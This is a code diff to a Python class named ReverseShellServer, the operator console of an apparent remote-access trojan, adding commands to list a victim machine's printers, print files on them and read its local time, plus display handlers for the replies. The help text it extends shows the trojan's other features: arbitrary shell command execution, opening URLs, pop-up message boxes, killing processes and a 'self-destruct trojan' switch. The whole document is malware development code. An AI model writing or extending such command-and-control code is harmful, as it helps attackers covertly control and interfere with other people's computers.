@@ -371,6 +371,43 @@ class ReverseShellServer:
         
         print(f"Total suspended: {data.get('total_suspended', 0)}")
 
+
+    def display_printer_list(self, printers):
+        """Display list of printers"""
+        print("\n" + "="*70)
+        print("AVAILABLE PRINTERS")
+        print("="*70)
+        print(f"{'Name':<30} {'Driver':<25} {'Port':<15} {'Status':<15} {'Shared':<8}")
+        print("-" * 95)
+        
+        for printer in printers:
+            name = printer.get('name', 'Unknown')[:29]
+            driver = printer.get('driver', 'Unknown')[:24]
+            port = printer.get('port', 'Unknown')[:14]
+            status = printer.get('status', 'Unknown')[:14]
+            shared = printer.get('shared', 'No')[:7]
+            
+            print(f"{name:<30} {driver:<25} {port:<15} {status:<15} {shared:<8}")
+        
+        print(f"\nTotal printers: {len(printers)}")
+
+    def display_local_time(self, time_info):
+        """Display local time information"""
+        print("\n" + "="*50)
+        print("LOCAL TIME INFORMATION")
+        print("="*50)
+        
+        print(f"  Date: {time_info.get('date', 'N/A')}")
+        print(f"  Time: {time_info.get('time', 'N/A')} ({time_info.get('time_12h', 'N/A')})")
+        print(f"  Day: {time_info.get('day_of_week', 'N/A')}")
+        print(f"  Timezone: {time_info.get('timezone', 'N/A')} (UTC{time_info.get('utc_offset_hours', 0):+.1f})")
+        print(f"  DST Active: {'Yes' if time_info.get('is_dst', False) else 'No'}")
+        print(f"  ISO Format: {time_info.get('iso_format', 'N/A')}")
+        print(f"  Unix Timestamp: {time_info.get('unix_timestamp', 'N/A')}")
+        
+        if 'uptime' in time_info:
+            print(f"  System Uptime: {time_info['uptime']}")
+
     def display_killed_processes(self, data):
         print("\n" + "="*50)
         print("KILLED PROCESSES")
@@ -409,6 +446,9 @@ class ReverseShellServer:
         print("kill_switch       - Self-destruct trojan")
         print("open_page <url>   - Open URL in browser")
         print("msgbox <title>|<message>|<type> - Show message box (types: info, warning, error)")
+        print("list_printers     - List available printers")
+        print("print <file> <printer> - Print file to specified printer")
+        print("local_time        - Show local time of client")
         print("<command>         - Execute shell command")
         print("exit/quit         - Exit shell")
         print("help              - Show this help")
@@ -538,6 +578,41 @@ class ReverseShellServer:
             url = command[10:].strip().strip('"\'')
             self.send_encrypted(client_sock, {"type": "open_page", "command": url})
 
+        elif command.lower() == 'list_printers':
+            self.send_encrypted(client_sock, {"type": "list_printers"})
+
+        elif command.lower().startswith('print '):
+            import shlex
+            try:
+                parts = shlex.split(command)
+                if len(parts) >= 2:
+                    file_path = parts[1]
+                    printer_name = parts[2] if len(parts) >= 3 else ""
+                        
+                    self.send_encrypted(client_sock, {
+                        "type": "print_file",
+                        "file_path": file_path,
+                        "printer_name": printer_name
+                    })
+                else:
+                    print("[-] Usage: print <file_path> [printer_name]")
+            except:
+                parts = command.split(' ', 2)
+                if len(parts) >= 2:
+                    file_path = parts[1].strip('"\'')
+                    printer_name = parts[2].strip('"\'') if len(parts) >= 3 else ""
+                        
+                    self.send_encrypted(client_sock, {
+                        "type": "print_file",
+                        "file_path": file_path,
+                        "printer_name": printer_name
+                    })
+                else:
+                    print("[-] Usage: print <file_path> [printer_name]")
+
+        elif command.lower() == 'local_time':
+            self.send_encrypted(client_sock, {"type": "local_time"})
+
         elif command.lower().startswith('msgbox '):
             params = command[7:].strip()
             
@@ -644,6 +719,28 @@ class ReverseShellServer:
                     print(f"[+] {result['output']}")
                 elif "error" in result:
                     print(f"[-] Shutdown error: {result['error']}")
+            elif "printer_list" in response:
+                result = response["printer_list"]
+                if "printers" in result:
+                    self.display_printer_list(result["printers"])
+                elif "error" in result:
+                    print(f"[-] Printer list error: {result['error']}")
+
+            elif "print_result" in response:
+                result = response["print_result"]
+                if "success" in result and result["success"]:
+                    print(f"[+] {result['message']}")
+                    print(f"    File: {result.get('file', 'N/A')}")
+                    print(f"    Printer: {result.get('printer', 'N/A')}")
+                elif "error" in result:
+                    print(f"[-] Print error: {result['error']}")
+
+            elif "local_time_result" in response:
+                result = response["local_time_result"]
+                if "local_time" in result:
+                    self.display_local_time(result["local_time"])
+                elif "error" in result:
+                    print(f"[-] Local time error: {result['error']}")
             elif "startup_result" in response:
                 result = response["startup_result"]
                 if "success" in result:
